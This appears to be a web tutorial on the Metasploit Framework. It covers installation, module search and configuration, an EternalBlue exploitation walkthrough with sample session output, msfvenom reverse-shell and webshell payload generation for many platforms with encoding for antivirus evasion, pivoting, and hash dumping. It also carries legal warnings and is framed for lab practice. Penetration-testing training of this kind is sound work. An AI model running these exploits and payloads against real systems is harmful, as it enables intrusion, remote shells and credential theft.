01 · INTRODUCTION

💥 What Is Metasploit?

Metasploit Framework is the world's most widely used penetration testing framework. Originally created by H.D. Moore in 2003, it was acquired by Rapid7 in 2009 and has become the de facto standard for exploit development, delivery, and post-exploitation.

Metasploit provides a complete environment for testing vulnerabilities: a massive database of exploits (2000+), payloads, encoders, auxiliary modules, and post-exploitation modules. It handles everything from reconnaissance to gaining a shell and pivoting deeper into a network.

For ethical hackers, Metasploit is essential. It's used daily by penetration testers, red teams, and bug bounty hunters. It's also a favorite target for defenders — many security tools are designed specifically to detect Metasploit's default behaviors.

💡 Note: Metasploit is written in Ruby. If you want to write custom modules, you'll need to learn Ruby. But for using it, no programming is required.

03 · INSTALLATION

⬇️ Installing Metasploit

Option 1: Pre-installed on Kali

Metasploit comes pre-installed on Kali Linux. Just run:

sudo msfconsole

Option 2: Install on Kali

sudo apt update sudo apt install metasploit-framework # Start the database service sudo systemctl start postgresql sudo systemctl enable postgresql # Initialize the database sudo msfdb init # Launch Metasploit sudo msfconsole

Option 3: Official Installer (Linux/macOS)

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall chmod 755 msfinstall sudo ./msfinstall
💡 Note: Metasploit needs PostgreSQL for its database features. Always run msfdb init before starting msfconsole.

06 · SEARCH & USE

🔍 Searching & Loading Modules

Search Syntax

# Basic search msf6 > search ms17-010 # Filter by type msf6 > search type:exploit platform:windows smb # Filter by CVE msf6 > search cve:2021-44228 # Filter by author msf6 > search author:hdmoore # Filter by rank (excellent, great, good, normal, average, low, manual) msf6 > search rank:excellent type:exploit # Combine filters msf6 > search type:auxiliary name:ssh platform:linux # Search by port msf6 > search port:445 type:exploit

Using a Module

# Select the module msf6 > use exploit/windows/smb/ms17_010_eternalblue # Show info about it msf6 exploit(...) > info # Show required options msf6 exploit(...) > show options
07 · CONFIGURING MODULES

⚙️ Configuring Module Options

Every module has options you must configure. The most common are RHOSTS (target), RPORT (target port), LHOST (your IP), and LPORT (your listening port).

# Set target msf6 exploit(...) > set RHOSTS 192.168.1.100 msf6 exploit(...) > set RPORT 445 # Set our listener msf6 exploit(...) > set LHOST 192.168.1.50 msf6 exploit(...) > set LPORT 4444 # Choose payload msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp # Set target (0 = auto) msf6 exploit(...) > set TARGET 0 # Global options (apply to all modules) msf6 > setg LHOST 192.168.1.50 msf6 > setg LPORT 4444 # Verify options msf6 exploit(...) > show options
💡 Pro Tip: Use setg for LHOST and LPORT at the top level — they'll apply to every module you use afterward, saving you typing.
08 · YOUR FIRST EXPLOIT

🚀 Running Your First Exploit

Let's walk through a full exploitation workflow using the famous MS17-010 EternalBlue vulnerability (Windows SMB). Only test this against a lab machine like Metasploitable3 or a Windows 7/2008 VM.

# Step 1: Launch msfconsole sudo msfconsole # Step 2: Search for the exploit msf6 > search ms17-010 # Step 3: Use the module msf6 > use exploit/windows/smb/ms17_010_eternalblue # Step 4: Show options msf6 exploit(...) > show options # Step 5: Configure msf6 exploit(...) > set RHOSTS 192.168.1.100 msf6 exploit(...) > set LHOST 192.168.1.50 msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp # Step 6: Verify target is vulnerable msf6 exploit(...) > check # Step 7: Exploit! msf6 exploit(...) > exploit

After a successful exploit, you'll see something like:

[*] Started reverse TCP handler on 192.168.1.50:4444 [*] 192.168.1.100:445 - Connecting to target... [+] 192.168.1.100:445 - Connection established [*] 192.168.1.100:445 - Target OS: Windows 7 Ultimate [+] 192.168.1.100:445 - Shellcode injected! [*] Meterpreter session 1 opened (192.168.1.50:4444 → 192.168.1.100:49158) meterpreter >
⚠️ Legal Warning: EternalBlue crashed countless systems worldwide. Never run it against systems you don't own or have permission to test. Practice on Metasploitable3 or a local Windows VM.

10 · MSFVENOM

💣 msfvenom — Payload Generation

msfvenom combines msfpayload and msfencode into one tool for generating standalone payloads in dozens of formats.

Basic Syntax

msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>

Common Payload Examples

# Windows EXE (reverse shell) msfvenom -p windows/x64/meterpreter/reverse_tcp \ LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe # Windows EXE (reverse shell, stageless) msfvenom -p windows/x64/meterpreter_reverse_tcp \ LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe # Linux ELF msfvenom -p linux/x64/meterpreter/reverse_tcp \ LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf # PHP webshell msfvenom -p php/meterpreter/reverse_tcp \ LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php # Python reverse shell msfvenom -p python/meterpreter/reverse_tcp \ LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py # Android APK msfvenom -p android/meterpreter/reverse_tcp \ LHOST=192.168.1.50 LPORT=4444 -o shell.apk # JSP web app msfvenom -p java/jsp_shell_reverse_tcp \ LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp # ASP (Windows IIS) msfvenom -p windows/meterpreter/reverse_tcp \ LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp # PowerShell one-liner msfvenom -p windows/x64/meterpreter/reverse_tcp \ LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1 # Base64-encoded (for command injection) msfvenom -p windows/x64/meterpreter/reverse_tcp \ LHOST=192.168.1.50 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o shell_enc.exe

Handlers — Catching Payloads

Standalone payloads need a listener. Use exploit/multi/handler:

msf6 > use exploit/multi/handler msf6 exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp msf6 exploit(handler) > set LHOST 192.168.1.50 msf6 exploit(handler) > set LPORT 4444 msf6 exploit(handler) > set ExitOnSession false msf6 exploit(handler) > exploit -j

12 · PIVOTING

🔀 Pivoting Into Internal Networks

Once you've compromised a host, you can use it as a pivot point to attack other machines on the same internal network.

# Step 1: Add route through the compromised host meterpreter > run post/multi/manage/autoroute meterpreter > background # Step 2: Set up SOCKS proxy for tools msf6 > use auxiliary/server/socks_proxy msf6 > set SRVHOST 127.0.0.1 msf6 > set SRVPORT 1080 msf6 > set VERSION 5 msf6 > run -j # Step 3: Use proxychains to route other tools proxychains nmap -sT -Pn 10.10.10.0/24 # Step 4: Or use Metasploit modules with Route msf6 > use exploit/windows/smb/ms17_010_eternalblue msf6 > set RHOSTS 10.10.10.5 msf6 > set PAYLOAD windows/x64/meterpreter/bind_tcp msf6 > exploit
💡 Pro Tip: Use bind_tcp payloads for pivoting through strict firewalls. The compromised host opens the listener, and you connect through the pivot.

15 · DATABASE INTEGRATION

🗄️ Metasploit Database Integration

Metasploit integrates with PostgreSQL to store hosts, services, vulnerabilities, loot, and credentials. This is essential for managing large pentests.

# Initialize database (one-time) sudo msfdb init # Check DB status msf6 > db_status # Import Nmap scan msf6 > db_import scan.xml # Import Nessus scan msf6 > db_import nessus_scan.nessus # Run Nmap directly in Metasploit msf6 > db_nmap -sV -sC 192.168.1.0/24 # List hosts msf6 > hosts # List services msf6 > services # List vulnerabilities msf6 > vulns # List credentials msf6 > creds # List loot (files, hashes) msf6 > loot # Search for hosts with specific service msf6 > services -p 445 -S 192.168.1.
16 · BEST PRACTICES

✅ Metasploit Best Practices

  1. Always run check first — verify vulnerability before exploiting.
  2. Use Meterpreter — more powerful than plain shell.
  3. Migrate to a stable process — prevents session loss if the exploited service crashes.
  4. Use setg for LHOST/LPORT — saves typing.
  5. Enable database — db_nmap and db_import for organized workflow.
  6. Background sessions — keep multiple sessions alive for pivoting.
  7. Use stageless payloads for reliability over slow networks.
  8. Rotate payloads — default signatures are detected by AV.
  9. Test in a lab first — always verify exploits before use.
  10. Clean up after yourself — remove uploaded files, kill sessions.

Session Management

# List all sessions msf6 > sessions -l # Interact with a session msf6 > sessions -i 2 # Background current session meterpreter > background # Upgrade shell to meterpreter msf6 > sessions -u 1 # Run a module against a session msf6 > use post/windows/gather/hashdump msf6 > set SESSION 1 msf6 > run
17 · LEGAL & ETHICS

⚖️ Legal & Ethical Boundaries

⚠️ Critical Warning: Metasploit is an extremely powerful offensive tool. Using it against systems you don't own or have explicit written permission to test is a serious federal crime. Unauthorized access carries up to 10 years in prison in most jurisdictions.

Before You Exploit

  • Get written authorization — Signed Rules of Engagement.
  • Define scope — Only test approved targets.
  • Agree on timing — Off-hours for production systems.
  • Have a rollback plan — Some exploits crash systems.
  • Warn the SOC — So they don't panic when they see shells.
  • Document everything — Every command, every session, every finding.

18 · CONCLUSION

🎓 Final Thoughts

Metasploit Framework is the most important exploitation tool in the ethical hacker's arsenal. It's used daily by pentesters, red teams, and bug bounty hunters worldwide. Mastering it is essential for any serious security career.

But remember: Metasploit is a tool, not a substitute for knowledge. You still need to understand the vulnerabilities, the target environment, and the attack chain. Metasploit just makes the exploitation phase faster and more reliable.

The learning journey:

  1. Learn msfconsole basics — search, use, show, set, run.
  2. Practice with Metasploitable 2/3 — the intended practice target.
  3. Master Meterpreter — post-exploitation is where the real power lies.
  4. Learn msfvenom — generate custom payloads for any format.
  5. Practice pivoting — attack internal networks through a compromised host.
  6. Study modules — read the Ruby source to understand how exploits work.
  7. Write your own modules — the ultimate skill for a Metasploit master.
🚀 Next Steps: Install Metasploitable 3 in VirtualBox, launch Metasploit, and work through the machines on HackTheBox. In a few weeks, you'll be exploiting like a pro.

Happy hacking — ethically. 💥
